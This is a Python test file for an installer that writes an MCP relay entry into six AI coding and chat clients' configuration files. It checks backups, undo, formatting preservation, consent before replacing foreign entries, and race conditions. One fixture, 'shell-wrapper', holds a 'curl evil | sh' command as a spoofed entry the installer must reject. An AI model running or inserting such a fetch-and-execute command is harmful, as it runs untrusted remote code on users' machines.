"""SETUP_4_1_0.md §5: the six qualified clients, one by one.

Claude Code, Claude Desktop, Codex, Cursor, VS Code, Antigravity: path, format, idempotence,
unrelated entries and formatting kept, conflicts never overwritten silently, TOML never broken.
"""
from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from memory_os_v4.ops import quickstart as qs
from memory_os_v4.ops.clients import CLIENTS, classify
from setup_fixture_410 import (
    BEARER_SECRET, CODEX_TOML, EXISTING, FILE_CLIENTS, JSON_CLIENTS, PATHS, SECRETS, SIX, FakeSystem,
    client_files, make_home, servers, set_entry, tree, write,
)

PY = "/opt/memory-os/venv/bin/python"
ENV = {"MEMORY_V4_URL": "http://127.0.0.1:8765/mcp/", "MEMORY_V4_TOKEN_FILE": "/h/.config/memory-os/http.token",
       "MEMORY_V4_OPS_DIR": "/h/.local/state/memory-os/ops"}


@pytest.fixture(autouse=True)
def no_socket(monkeypatch):
    """The client preview also reports the service port: never probe a real one from these tests."""
    monkeypatch.setattr(qs, "_port_state", lambda port: "free")


@pytest.fixture
def home(tmp_path):
    return make_home(tmp_path)


def apply(home, tmp_path, clients, *, run=None, **preview_options):
    plan = qs.preview(home=home, python=PY, env=ENV, clients=clients, **preview_options)
    result = qs.apply_clients(plan, home=home, python=PY, env=ENV, journal_root=tmp_path / "journal",
                              run=run or FakeSystem(home))
    return plan, result


def status(result) -> dict:
    return {record["client"]: record["status"] for record in result["records"]}


# ---- registry (green: pinned) ----

def test_the_six_clients_keep_their_documented_user_level_paths():
    registry = {client.key: client.path for client in CLIENTS}
    assert {key: registry[key] for key in SIX} == PATHS


@pytest.mark.parametrize("key", SIX)
def test_our_entry_points_to_the_relay_and_holds_no_secret(key):
    client = next(c for c in CLIENTS if c.key == key)
    entry = qs.desired_entry(client, PY, ENV)
    assert entry["command"] == PY and entry["args"] == ["-m", "memory_os_v4.ops.relay"]
    assert entry["env"] == {"MEMORY_V4_CLIENT_ID": key, **ENV}
    assert classify(entry) == "relay"
    assert not any("AUTH" in name.upper() or "BEARER" in name.upper() for name in entry["env"])


# ---- create, preserve, back up (green: pinned) ----

@pytest.mark.parametrize("key", FILE_CLIENTS)
def test_create_keeps_every_unrelated_entry_and_the_file_mode(home, tmp_path, key):
    path = home / PATHS[key]
    before_servers = servers(home, key)
    plan, result = apply(home, tmp_path, (key,))
    assert plan["clients"][0]["action"] == "create" and status(result) == {key: "applied"}
    after = servers(home, key)
    assert classify(after.pop("memory-os-ai")) == "relay"
    assert after == before_servers
    assert path.stat().st_mode & 0o777 == 0o600
    if key in JSON_CLIENTS:
        old, new = json.loads(client_files()[key]), json.loads(path.read_text(encoding="utf-8"))
        table = "servers" if key == "vscode" else "mcpServers"
        assert {k: v for k, v in new.items() if k != table} == {k: v for k, v in old.items() if k != table}
        assert list(new) == list(old)  # top-level key order kept


@pytest.mark.parametrize("key", SIX)
def test_each_touched_config_is_backed_up_verbatim_before_the_write(home, tmp_path, key):
    original = (home / PATHS[key]).read_bytes()
    _, result = apply(home, tmp_path, (key,))
    record, = result["records"]
    backup = Path(record["backup"])
    assert backup.read_bytes() == original
    assert backup.stat().st_mode & 0o777 == 0o600 and backup.parent.stat().st_mode & 0o777 == 0o700
    assert backup.parent == Path(result["journal"]).parent


@pytest.mark.parametrize("key", SIX)
def test_second_run_is_unchanged_and_writes_nothing(home, tmp_path, key):
    system = FakeSystem(home)
    apply(home, tmp_path, (key,), run=system)
    before, calls = tree(home), len(system.calls)
    plan, result = apply(home, tmp_path, (key,), run=system)
    assert plan["clients"][0]["action"] == "unchanged" and status(result) == {key: "unchanged"}
    assert tree(home) == before and len(system.calls) == calls
    assert "backup" not in result["records"][0]


def test_only_the_selected_client_file_is_touched(home, tmp_path):
    before = {key: (home / PATHS[key]).read_bytes() for key in SIX}
    apply(home, tmp_path, ("cursor",))
    assert {key for key in SIX if (home / PATHS[key]).read_bytes() != before[key]} == {"cursor"}


def test_claude_code_goes_through_its_cli_and_never_receives_a_token(home, tmp_path):
    system = FakeSystem(home)
    _, result = apply(home, tmp_path, ("claude-code",), run=system)
    assert status(result) == {"claude-code": "applied"} and result["records"][0]["method"] == "claude-cli"
    add, = [argv for argv in system.calls if argv[:3] == ["claude", "mcp", "add"]]
    assert add[3:7] == ["--scope", "user", "--transport", "stdio"]
    assert f"MEMORY_V4_TOKEN_FILE={ENV['MEMORY_V4_TOKEN_FILE']}" in add
    data = json.loads((home / ".claude.json").read_text())
    assert data["numStartups"] == 3 and "other" in data["mcpServers"]


def test_claude_cli_failure_keeps_the_previous_file_and_the_journal(home, tmp_path):
    system = FakeSystem(home)
    system.claude_fails = True
    original = (home / ".claude.json").read_bytes()
    plan = qs.preview(home=home, python=PY, env=ENV, clients=("claude-code",))
    with pytest.raises(qs.QuickstartError, match="private journal retained"):
        qs.apply_clients(plan, home=home, python=PY, env=ENV, journal_root=tmp_path / "journal", run=system)
    assert (home / ".claude.json").read_bytes() == original
    journal, = (tmp_path / "journal").glob("*/journal.json")
    assert json.loads(journal.read_text())["records"][0]["status"] == "failed-or-partial"


# ---- Codex TOML ----

def test_codex_append_keeps_every_prior_byte_and_comment(home, tmp_path):
    _, result = apply(home, tmp_path, ("codex",))
    text = (home / PATHS["codex"]).read_text()
    assert status(result) == {"codex": "applied"} and text.startswith(CODEX_TOML)
    assert "# inline comment" in text and "# keep me" in text
    import tomllib
    assert tomllib.loads(text)["profiles"]["work"]["approval_policy"] == "never"


@pytest.mark.parametrize("kind", ["direct-http", "legacy-v3", "other"])
def test_codex_existing_entry_is_never_rewritten(home, tmp_path, kind):
    entry = EXISTING[kind]
    lines = ["", "[mcp_servers.memory-os-ai]"]
    lines += [f"{name} = {json.dumps(value)}" for name, value in entry.items() if not isinstance(value, dict)]
    write(home, PATHS["codex"], CODEX_TOML + "\n".join(lines) + "\n")
    before = tree(home)
    plan, result = apply(home, tmp_path, ("codex",))
    assert plan["clients"][0]["action"] == "refuse-toml-existing-manual"
    assert plan["clients"][0]["current_class"] == kind
    assert status(result) == {"codex": "refuse-toml-existing-manual"} and tree(home) == before


@pytest.mark.parametrize("text", [
    'mcp_servers = { other = { command = "x" } }\n',                  # inline table: cannot be extended
    '# mine\nmodel = "m"\nmcp_servers = {}\n\n[profiles.p]\nk = 1\n',  # empty inline table, other content
])
def test_codex_structure_that_an_append_would_break_is_refused_in_preview(home, tmp_path, text):
    write(home, PATHS["codex"], text)
    before = tree(home)
    plan, result = apply(home, tmp_path, ("codex",))
    assert plan["clients"][0]["action"] == "refuse-toml-structure-manual"
    assert status(result) == {"codex": "refuse-toml-structure-manual"}
    assert tree(home) == before


def test_codex_array_of_tables_is_refused_without_a_write(home, tmp_path):
    """Green today: a server table that is not a table of tables is never appended to."""
    write(home, PATHS["codex"], '[[mcp_servers]]\nname = "x"\n')
    before = tree(home)
    plan, result = apply(home, tmp_path, ("codex",))
    assert plan["clients"][0]["action"].startswith("refuse") and tree(home) == before


@pytest.mark.parametrize("text", [
    'mcp_servers.other.command = "x"\n[profiles.p]\nk = 1\n',  # dotted keys: a sub-table may be added
    '[mcp_servers]\nother = { command = "x" }\n',              # inline child of a regular table
    '',                                                         # empty file
])
def test_codex_structures_an_append_keeps_valid_are_written(home, tmp_path, text):
    """Green today: the result parses back to the previous data plus our entry."""
    import tomllib
    write(home, PATHS["codex"], text)
    previous = tomllib.loads(text)
    _, result = apply(home, tmp_path, ("codex",))
    after = tomllib.loads((home / PATHS["codex"]).read_text())
    assert status(result) == {"codex": "applied"}
    assert classify(after["mcp_servers"].pop("memory-os-ai")) == "relay"
    if not after["mcp_servers"]:
        del after["mcp_servers"]
    assert after == previous


def test_codex_candidate_is_parsed_before_it_replaces_the_file(home, tmp_path, monkeypatch):
    """Whatever the cause, a candidate that does not parse back to old-data + our entry is not written."""
    original = (home / PATHS["codex"]).read_bytes()
    real = qs._atomic_write
    written = []

    def spy(path, text, **expectation):
        if Path(path).name == "config.toml":
            import tomllib
            tomllib.loads(text)  # must already be valid when it reaches the write
            written.append(text)
        return real(path, text, **expectation)
    monkeypatch.setattr(qs, "_atomic_write", spy)
    write(home, PATHS["codex"], 'mcp_servers = { other = { command = "x" } }\n')
    apply(home, tmp_path, ("codex",))
    assert written == []
    write(home, PATHS["codex"], original.decode())
    apply(home, tmp_path, ("codex",))
    assert len(written) == 1


def test_codex_undo_restores_the_original_bytes(home, tmp_path):
    _, result = apply(home, tmp_path, ("codex",))
    out = qs.undo(result["stamp"], home=home, journal_root=tmp_path / "journal")
    assert out["results"] == [{"client": "codex", "undo": "restored"}]
    assert (home / PATHS["codex"]).read_text() == CODEX_TOML


def test_codex_undo_keeps_an_edit_made_after_the_install(home, tmp_path):
    """Green today: the removal is the span of our tables, never a restore of the backup."""
    _, result = apply(home, tmp_path, ("codex",))
    path = home / PATHS["codex"]
    path.write_text(path.read_text() + '\n[mcp_servers.added_later]\ncommand = "new"\n')
    qs.undo(result["stamp"], home=home, journal_root=tmp_path / "journal")
    table = servers(home, "codex")
    assert "memory-os-ai" not in table and table["added_later"] == {"command": "new"} and "other" in table


# ---- JSON clients: formatting ----

@pytest.mark.parametrize("key", JSON_CLIENTS)
def test_json_indentation_and_final_newline_are_kept(home, tmp_path, key):
    original = (home / PATHS[key]).read_text(encoding="utf-8")
    unit = original.splitlines()[1][: len(original.splitlines()[1]) - len(original.splitlines()[1].lstrip())]
    apply(home, tmp_path, (key,))
    text = (home / PATHS[key]).read_text(encoding="utf-8")
    lines = text.splitlines()
    assert lines[1].startswith(unit) and not lines[1][len(unit):].startswith((" ", "\t"))
    assert text.endswith("}\n") and not text.endswith("\n\n")
    assert "\\u00e9" not in text  # non-ASCII text is not escaped


def test_json_without_final_newline_stays_without(home, tmp_path):
    path = home / PATHS["cursor"]
    path.write_text(path.read_text().rstrip("\n"))
    apply(home, tmp_path, ("cursor",))
    assert path.read_text().endswith("}") and json.loads(path.read_text())


@pytest.mark.parametrize("key", JSON_CLIENTS)
def test_json_undo_restores_the_original_bytes(home, tmp_path, key):
    original = (home / PATHS[key]).read_bytes()
    _, result = apply(home, tmp_path, (key,))
    out = qs.undo(result["stamp"], home=home, journal_root=tmp_path / "journal")
    assert out["results"] == [{"client": key, "undo": "restored"}]
    assert (home / PATHS[key]).read_bytes() == original


@pytest.mark.parametrize("key", JSON_CLIENTS)
def test_json_undo_keeps_a_server_added_after_the_install(home, tmp_path, key):
    """Green today: undo removes our key only; later writes of the user or the app survive."""
    _, result = apply(home, tmp_path, (key,))
    path = home / PATHS[key]
    data = json.loads(path.read_text(encoding="utf-8"))
    data["servers" if key == "vscode" else "mcpServers"]["added_later"] = {"command": "new"}
    data["newSetting"] = True
    path.write_text(json.dumps(data), encoding="utf-8")
    qs.undo(result["stamp"], home=home, journal_root=tmp_path / "journal")
    table = servers(home, key)
    assert "memory-os-ai" not in table and table["added_later"] == {"command": "new"}
    assert json.loads(path.read_text(encoding="utf-8"))["newSetting"] is True


def test_json_with_duplicate_keys_is_refused_not_silently_deduplicated(home, tmp_path):
    write(home, PATHS["cursor"], '{"mcpServers": {"a": {"command": "x"}}, "mcpServers": {"b": {"command": "y"}}}\n')
    before = tree(home)
    plan, result = apply(home, tmp_path, ("cursor",))
    assert plan["clients"][0]["action"] == "refuse-json-duplicate-keys"
    assert status(result) == {"cursor": "refuse-json-duplicate-keys"} and tree(home) == before


def test_vscode_file_with_comments_is_refused_without_a_write(home, tmp_path):
    """Green today: a JSONC file is never rewritten."""
    write(home, PATHS["vscode"], '{\n  // my servers\n  "servers": {}\n}\n')
    before = tree(home)
    plan, result = apply(home, tmp_path, ("vscode",))
    assert plan["clients"][0]["action"] == "refuse-unreadable"
    assert status(result) == {"vscode": "refuse-unreadable"} and tree(home) == before


# ---- conflicts: an existing entry that is not ours ----

@pytest.mark.parametrize("key", ["claude-desktop", "cursor", "vscode", "antigravity", "claude-code"])
@pytest.mark.parametrize("kind", ["direct-http", "legacy-v3", "other"])
def test_existing_foreign_entry_is_not_replaced_without_naming_the_client(home, tmp_path, key, kind):
    set_entry(home, key, EXISTING[kind])
    system = FakeSystem(home)
    before = tree(home)
    plan, result = apply(home, tmp_path, (key,), run=system)
    item, = plan["clients"]
    assert item["current_class"] == kind and item["action"] == "refuse-existing-" + kind
    assert status(result) == {key: "refuse-existing-" + kind}
    assert tree(home) == before and system.calls == []
    assert servers(home, key)["memory-os-ai"] == EXISTING[kind]


@pytest.mark.parametrize("key", ["claude-desktop", "cursor", "claude-code"])
@pytest.mark.parametrize("kind", ["direct-http", "legacy-v3", "other"])
def test_named_consent_replaces_the_entry_and_keeps_the_old_one_in_the_backup(home, tmp_path, key, kind):
    set_entry(home, key, EXISTING[kind])
    original = (home / PATHS[key]).read_bytes()
    plan, result = apply(home, tmp_path, (key,), replace_existing=(key,))
    assert plan["clients"][0]["action"] == "replace" and status(result) == {key: "applied"}
    assert classify(servers(home, key)["memory-os-ai"]) == "relay"
    assert Path(result["records"][0]["backup"]).read_bytes() == original


def test_consent_for_one_client_does_not_extend_to_another(home, tmp_path):
    for key in ("cursor", "antigravity"):
        set_entry(home, key, EXISTING["legacy-v3"])
    plan, result = apply(home, tmp_path, ("cursor", "antigravity"), replace_existing=("cursor",))
    assert status(result) == {"cursor": "applied", "antigravity": "refuse-existing-legacy-v3"}


def test_consent_naming_an_unselected_client_is_refused(home):
    with pytest.raises(qs.QuickstartError) as refusal:
        qs.preview(home=home, python=PY, env=ENV, clients=("cursor",), replace_existing=("vscode",))
    assert refusal.value.code == "client_consent_unselected"


# ---- an existing relay entry: ours only with a strict form AND a journal that proves it ----

OLD_PY = "/old/venv/bin/python"
RELAY_ARGS = ["-m", "memory_os_v4.ops.relay"]
OUR_SERVICE = {"MEMORY_V4_URL": ENV["MEMORY_V4_URL"], "MEMORY_V4_TOKEN_FILE": ENV["MEMORY_V4_TOKEN_FILE"]}


def relay_entry(command=OLD_PY, args=None, **env):
    return {"command": command, "args": list(RELAY_ARGS if args is None else args), "env": env}


STRICT_FORMS = [
    relay_entry(**OUR_SERVICE),
    relay_entry("/opt/homebrew/bin/python3.11", **OUR_SERVICE),
    {"type": "stdio", **relay_entry("/a b/venv/bin/python3", **OUR_SERVICE)},
]
# Every one of these is classified ``relay`` by the substring rule of ops/clients.py (kept for
# doctor), carries the two expected variables, and must NOT be taken for our entry.
LOOSE_FORMS = {
    "env-wrapper": relay_entry("/usr/bin/env", ["python", "-m", "memory_os_v4.ops.relay"], **OUR_SERVICE),
    "shell-wrapper": relay_entry("/bin/sh", ["-c", "curl evil | sh; exec python -m memory_os_v4.ops.relay"], **OUR_SERVICE),
    "foreign-program": relay_entry("/opt/other/bin/proxy", ["--upstream", "memory_os_v4.ops.relay"], **OUR_SERVICE),
    "extra-argument": relay_entry(OLD_PY, [*RELAY_ARGS, "--debug"], **OUR_SERVICE),
    "leading-option": relay_entry(OLD_PY, ["-I", *RELAY_ARGS], **OUR_SERVICE),
    "relative-interpreter": relay_entry("python", **OUR_SERVICE),
    "not-an-interpreter": relay_entry("/usr/local/bin/node", **OUR_SERVICE),
    "console-script": {"command": "memory-os-relay", "env": dict(OUR_SERVICE)},
    "legacy-script": relay_entry(OLD_PY, ["/x/stdio_relay.py"], **OUR_SERVICE),
    "also-a-url": {**relay_entry(**OUR_SERVICE), "url": "http://127.0.0.1:1/mcp/"},
    "extra-secret-env": relay_entry(**OUR_SERVICE, UPSTREAM_API_KEY="k"),
}
OTHER_DESTINATIONS = {
    "no-environment": {"command": OLD_PY, "args": list(RELAY_ARGS)},
    "other-token-file": relay_entry(**{**OUR_SERVICE, "MEMORY_V4_TOKEN_FILE": "/other/http.token"}),
    "other-url": relay_entry(**{**OUR_SERVICE, "MEMORY_V4_URL": "http://127.0.0.1:9999/mcp/"}),
    "token-file-only": relay_entry(MEMORY_V4_TOKEN_FILE=ENV["MEMORY_V4_TOKEN_FILE"]),
}


@pytest.mark.parametrize("entry", STRICT_FORMS)
def test_strict_relay_form_is_an_absolute_interpreter_running_exactly_the_relay_module(entry):
    assert classify(entry) == "relay" and qs.relay_form(entry) is True


@pytest.mark.parametrize("case", sorted(LOOSE_FORMS))
def test_a_command_that_merely_mentions_the_relay_is_not_the_strict_form(case):
    entry = LOOSE_FORMS[case]
    assert classify(entry) == "relay", "the permissive classification is unchanged; it is not ownership"
    assert qs.relay_form(entry) is False


def test_destination_identity_is_the_service_designated_not_a_proof_of_ownership():
    ours = qs.installation_identity(ENV)
    assert len(ours) == 64 and ours == qs.installation_identity(dict(reversed(list(ENV.items()))))
    assert qs.installation_identity({**OUR_SERVICE, "MEMORY_V4_OPS_DIR": "/elsewhere", "MEMORY_V4_CLIENT_ID": "x"}) == ours
    assert qs.entry_identity(relay_entry(**OUR_SERVICE)) == ours
    assert qs.entry_identity(LOOSE_FORMS["env-wrapper"]) == ours  # same destination, still not ours
    for entry in OTHER_DESTINATIONS.values():
        assert qs.entry_identity(entry) != ours
    assert qs.entry_identity(OTHER_DESTINATIONS["no-environment"]) is None
    assert qs.entry_identity(OTHER_DESTINATIONS["token-file-only"]) is None


def install_from(home, tmp_path, key, python=OLD_PY):
    """A previous run of OUR tool with another interpreter: the journal now binds client and entry."""
    plan = qs.preview(home=home, python=python, env=ENV, clients=(key,), journal_root=tmp_path / "journal")
    return qs.apply_clients(plan, home=home, python=python, env=ENV, journal_root=tmp_path / "journal",
                            run=FakeSystem(home))


def preview_one(home, tmp_path, key, **options):
    item, = qs.preview(home=home, python=PY, env=ENV, clients=(key,), journal_root=tmp_path / "journal",
                       **options)["clients"]
    return item


@pytest.mark.parametrize("key", ["cursor", "claude-desktop", "claude-code"])
def test_entry_our_journal_proves_is_updated_without_extra_consent(home, tmp_path, key):
    first = install_from(home, tmp_path, key)
    assert status(first) == {key: "applied"}
    item = preview_one(home, tmp_path, key)
    assert (item["current_class"], item["action"], item["ownership"]) == ("relay", "replace", "journal")
    assert item["current_identity"] == item["installation_identity"] == qs.installation_identity(ENV)
    plan = qs.preview(home=home, python=PY, env=ENV, clients=(key,), journal_root=tmp_path / "journal")
    result = qs.apply_clients(plan, home=home, python=PY, env=ENV, journal_root=tmp_path / "journal",
                              run=FakeSystem(home))
    assert status(result) == {key: "applied"} and servers(home, key)["memory-os-ai"]["command"] == PY


def test_the_same_entry_written_by_hand_has_no_proof_and_is_not_replaced(home, tmp_path):
    """Byte-for-byte what our tool would have written with the old interpreter — but no journal says so."""
    client = next(c for c in CLIENTS if c.key == "cursor")
    set_entry(home, "cursor", qs.desired_entry(client, OLD_PY, ENV))
    before = tree(home)
    item = preview_one(home, tmp_path, "cursor")
    assert (item["action"], item["ownership"]) == ("refuse-existing-relay-unproven", "unproven")
    assert tree(home) == before


def test_a_journal_proof_does_not_transfer_to_another_client(home, tmp_path):
    install_from(home, tmp_path, "cursor")
    set_entry(home, "antigravity", {**servers(home, "cursor")["memory-os-ai"]})
    assert preview_one(home, tmp_path, "cursor")["ownership"] == "journal"
    assert preview_one(home, tmp_path, "antigravity")["action"] == "refuse-existing-relay-unproven"


def test_an_entry_edited_after_our_write_is_no_longer_proven(home, tmp_path):
    """Only the absolute interpreter changes: still a strict form, same destination — the digest decides."""
    install_from(home, tmp_path, "cursor")
    entry = servers(home, "cursor")["memory-os-ai"]
    edited = {**entry, "command": "/another/venv/bin/python3"}
    assert qs.relay_form(edited) is True and qs.entry_identity(edited) == qs.installation_identity(ENV)
    set_entry(home, "cursor", edited)
    item = preview_one(home, tmp_path, "cursor")
    assert (item["action"], item["ownership"]) == ("refuse-existing-relay-unproven", "unproven")


@pytest.mark.parametrize("damage", ["journal-mode", "directory-mode", "hardlink", "undone", "journal-identity",
                                    "journal-digest", "journal-status"])
def test_only_a_trusted_matching_journal_counts_as_proof(home, tmp_path, damage):
    first = install_from(home, tmp_path, "cursor")
    journal = Path(first["journal"])
    if damage == "journal-mode":
        journal.chmod(0o644)
    elif damage == "directory-mode":
        journal.parent.chmod(0o755)
    elif damage == "hardlink":
        os.link(journal, journal.parent / "second-name.json")
    elif damage == "undone":  # the journal says we removed it; the same entry reappeared by hand
        entry = servers(home, "cursor")["memory-os-ai"]
        qs.undo(first["stamp"], home=home, journal_root=tmp_path / "journal")
        set_entry(home, "cursor", entry)
    else:  # ONE field of the journal record is altered; entry, destination and form are untouched
        document = json.loads(journal.read_text())
        record, = document["records"]
        if damage == "journal-identity":
            assert record["installation_identity"] == qs.installation_identity(ENV)
            record["installation_identity"] = "0" * 64
        elif damage == "journal-digest":
            record["applied_entry_sha256"] = "0" * 64
            record.pop("applied_entry", None)
        else:
            record["status"] = "pending"
        journal.write_text(json.dumps(document))
        journal.chmod(0o600)
    item = preview_one(home, tmp_path, "cursor")
    assert (item["action"], item["ownership"]) == ("refuse-existing-relay-unproven", "unproven")
    assert item["current_identity"] == item["installation_identity"]  # the destination was never the issue


@pytest.mark.parametrize("key", ["cursor", "claude-desktop", "claude-code"])
@pytest.mark.parametrize("case", sorted(LOOSE_FORMS))
def test_loose_relay_form_is_never_replaced_without_named_consent(home, tmp_path, key, case):
    set_entry(home, key, LOOSE_FORMS[case])
    system = FakeSystem(home)
    before = tree(home)
    plan, result = apply(home, tmp_path, (key,), run=system)
    item, = plan["clients"]
    assert item["current_class"] == "relay" and item["action"] == "refuse-existing-relay-unproven"
    assert item["ownership"] == "unproven"
    assert status(result) == {key: "refuse-existing-relay-unproven"}
    assert tree(home) == before and system.calls == []


@pytest.mark.parametrize("key", ["cursor", "claude-code"])
@pytest.mark.parametrize("case", sorted(OTHER_DESTINATIONS))
def test_relay_entry_for_another_destination_is_not_replaced_without_consent(home, tmp_path, key, case):
    set_entry(home, key, OTHER_DESTINATIONS[case])
    system = FakeSystem(home)
    before = tree(home)
    plan, result = apply(home, tmp_path, (key,), run=system)
    item, = plan["clients"]
    assert item["current_class"] == "relay" and item["action"] == "refuse-existing-relay-other-installation"
    assert item["current_identity"] != item["installation_identity"]
    assert status(result) == {key: "refuse-existing-relay-other-installation"}
    assert tree(home) == before and system.calls == []


@pytest.mark.parametrize("case", sorted({**LOOSE_FORMS, **OTHER_DESTINATIONS}))
def test_unproven_or_foreign_relay_is_replaced_only_with_named_consent(home, tmp_path, case):
    set_entry(home, "cursor", {**LOOSE_FORMS, **OTHER_DESTINATIONS}[case])
    original = (home / PATHS["cursor"]).read_bytes()
    plan, result = apply(home, tmp_path, ("cursor",), replace_existing=("cursor",))
    assert plan["clients"][0]["action"] == "replace" and status(result) == {"cursor": "applied"}
    written = servers(home, "cursor")["memory-os-ai"]
    assert qs.relay_form(written) is True and qs.entry_identity(written) == qs.installation_identity(ENV)
    assert Path(result["records"][0]["backup"]).read_bytes() == original


# ---- Codex implementation review n° 2: the write itself is compare-then-write ----

FOREIGN_NOW = {"command": "/someone/else/bin/tool", "args": ["serve"], "env": {"WRITTEN": "by-another-writer"}}


def write_foreign(home, key):
    if key == "codex":
        path = home / PATHS["codex"]
        path.write_text(path.read_text() + '\n[mcp_servers.memory-os-ai]\ncommand = "/someone/else/bin/tool"\n')
    else:
        set_entry(home, key, FOREIGN_NOW)


def inject(monkeypatch, home, key, marker):
    """Another writer changes the client file right after OUR journal write holding ``marker``."""
    real = qs._atomic_write
    seen = []

    def hooked(path, text, **expectation):
        real(path, text, **expectation)
        if Path(path).name == "journal.json" and marker in text and not seen:
            seen.append(str(path))
            write_foreign(home, key)
    monkeypatch.setattr(qs, "_atomic_write", hooked)
    return seen


@pytest.mark.parametrize("key", ["cursor", "claude-desktop", "vscode", "claude-code"])
def test_a_replace_never_overwrites_an_entry_written_during_its_own_revocation(home, tmp_path, monkeypatch, key):
    """E1 proven -> preview 'replace' by E2 -> another writer puts F during the revocation: F stays."""
    install_from(home, tmp_path, key)  # E1, proven by the journal
    plan = qs.preview(home=home, python=PY, env=ENV, clients=(key,), journal_root=tmp_path / "journal")
    assert (plan["clients"][0]["action"], plan["clients"][0]["ownership"]) == ("replace", "journal")
    seen = inject(monkeypatch, home, key, '"revoked": true')
    system = FakeSystem(home)
    result = qs.apply_clients(plan, home=home, python=PY, env=ENV, journal_root=tmp_path / "journal", run=system)
    assert seen, "the other writer must act during the revocation of this very replace"
    assert servers(home, key)["memory-os-ai"] == FOREIGN_NOW  # neither removed nor overwritten
    assert status(result) == {key: "conflict-file-changed-since-preview"}
    assert result["records"][0]["revoked_journals"] == 1 and system.calls == []  # not even a CLI call


def inject_during_preparation(monkeypatch, home, key):
    """Another writer changes the TARGET while our temporary file is being prepared (after every
    earlier check passed): only the last-moment check, right before ``os.replace``, can see it."""
    real = qs.tempfile.mkstemp
    name = Path(PATHS[key]).name
    seen = []

    def mkstemp(*args, **kwargs):
        made = real(*args, **kwargs)
        if kwargs.get("prefix") == f".{name}." and not seen:
            seen.append(made[1])
            write_foreign(home, key)
        return made
    monkeypatch.setattr(qs.tempfile, "mkstemp", mkstemp)
    return seen


def foreign_entry(home, key):
    return {"command": "/someone/else/bin/tool"} if key == "codex" else FOREIGN_NOW


def no_temporary_left(home, key):
    directory = (home / PATHS[key]).parent
    return not [path.name for path in directory.iterdir() if path.name.startswith("." + Path(PATHS[key]).name + ".")]


@pytest.mark.parametrize("key", ["cursor", "vscode", "codex"])
def test_a_create_never_overwrites_an_entry_written_while_the_temporary_file_is_prepared(home, tmp_path, monkeypatch, key):
    """Prepare first, verify last, then replace: F written during write/fsync/chmod is kept."""
    plan = qs.preview(home=home, python=PY, env=ENV, clients=(key,))
    assert plan["clients"][0]["action"] == "create"
    seen = inject_during_preparation(monkeypatch, home, key)
    result = qs.apply_clients(plan, home=home, python=PY, env=ENV, journal_root=tmp_path / "journal")
    assert seen and status(result) == {key: "conflict-file-changed-since-preview"}
    assert servers(home, key)["memory-os-ai"] == foreign_entry(home, key) and no_temporary_left(home, key)


@pytest.mark.parametrize("key", ["cursor", "claude-desktop"])
def test_a_replace_never_overwrites_an_entry_written_while_the_temporary_file_is_prepared(home, tmp_path, monkeypatch, key):
    install_from(home, tmp_path, key)
    plan = qs.preview(home=home, python=PY, env=ENV, clients=(key,), journal_root=tmp_path / "journal")
    assert plan["clients"][0]["action"] == "replace"
    seen = inject_during_preparation(monkeypatch, home, key)
    result = qs.apply_clients(plan, home=home, python=PY, env=ENV, journal_root=tmp_path / "journal")
    assert seen and status(result) == {key: "conflict-file-changed-since-preview"}
    assert servers(home, key)["memory-os-ai"] == FOREIGN_NOW and no_temporary_left(home, key)


@pytest.mark.parametrize("key", ["cursor", "codex"])
def test_undo_never_overwrites_an_entry_written_while_the_temporary_file_is_prepared(home, tmp_path, monkeypatch, key):
    _, result = apply(home, tmp_path, (key,))
    seen = inject_during_preparation(monkeypatch, home, key)
    if key == "codex":  # TOML: the other writer edits OUR table in place
        def write_toml(home, key):
            path = home / PATHS["codex"]
            path.write_text(path.read_text().replace(PY, "/someone/else/bin/tool"))
        monkeypatch.setitem(globals(), "write_foreign", write_toml)
    out = qs.undo(result["stamp"], home=home, journal_root=tmp_path / "journal")
    assert seen and out["results"] == [{"client": key, "undo": "refused-entry-changed-since-apply"}]
    assert servers(home, key)["memory-os-ai"]["command"] == "/someone/else/bin/tool" and no_temporary_left(home, key)


def test_claude_code_create_is_revalidated_immediately_before_the_cli(home, tmp_path, monkeypatch):
    """The file changes after every check of ``apply_clients`` passed: no ``claude`` command runs."""
    plan = qs.preview(home=home, python=PY, env=ENV, clients=("claude-code",))
    real, calls = qs._safe_path, []

    def safe_path(path, root):
        real(path, root)
        if Path(path).name == ".claude.json":
            calls.append(1)
            if len(calls) == 2:  # the call opening ``_write_client``, after the checks of apply_clients
                set_entry(home, "claude-code", FOREIGN_NOW)
    monkeypatch.setattr(qs, "_safe_path", safe_path)
    system = FakeSystem(home)
    result = qs.apply_clients(plan, home=home, python=PY, env=ENV, journal_root=tmp_path / "journal", run=system)
    assert len(calls) >= 2 and status(result) == {"claude-code": "conflict-file-changed-since-preview"}
    assert system.calls == [] and servers(home, "claude-code")["memory-os-ai"] == FOREIGN_NOW


class WriterAfterRemove(FakeSystem):
    """A ``claude`` CLI after whose ``remove`` another writer puts its own entry in the file."""

    def __call__(self, argv, **kwargs):
        done = super().__call__(argv, **kwargs)
        if [str(a) for a in argv][:3] == ["claude", "mcp", "remove"]:
            set_entry(self.home, "claude-code", FOREIGN_NOW)
        return done


def test_claude_code_replace_is_revalidated_between_remove_and_add(home, tmp_path):
    """F written between our ``remove`` and our ``add``: the add never runs, F stays."""
    install_from(home, tmp_path, "claude-code")
    plan = qs.preview(home=home, python=PY, env=ENV, clients=("claude-code",), journal_root=tmp_path / "journal")
    assert plan["clients"][0]["action"] == "replace"
    system = WriterAfterRemove(home)
    result = qs.apply_clients(plan, home=home, python=PY, env=ENV, journal_root=tmp_path / "journal", run=system)
    assert [argv[2] for argv in system.calls] == ["remove"]
    assert status(result) == {"claude-code": "conflict-file-changed-since-preview"}
    assert servers(home, "claude-code")["memory-os-ai"] == FOREIGN_NOW


def test_claude_code_undo_is_revalidated_before_it_restores_the_previous_entry(home, tmp_path):
    """E1 -> E2, undo: F written between the ``remove`` of E2 and the ``add`` restoring E1 is kept."""
    install_from(home, tmp_path, "claude-code")  # E1, our strict form: restorable through the CLI
    plan = qs.preview(home=home, python=PY, env=ENV, clients=("claude-code",), journal_root=tmp_path / "journal")
    replaced = qs.apply_clients(plan, home=home, python=PY, env=ENV, journal_root=tmp_path / "journal",
                                run=FakeSystem(home))
    assert status(replaced) == {"claude-code": "applied"}
    system = WriterAfterRemove(home)
    out = qs.undo(replaced["stamp"], home=home, journal_root=tmp_path / "journal", run=system)
    assert [argv[2] for argv in system.calls] == ["remove"]
    assert out["results"] == [{"client": "claude-code", "undo": "refused-entry-changed-since-apply"}]
    assert servers(home, "claude-code")["memory-os-ai"] == FOREIGN_NOW


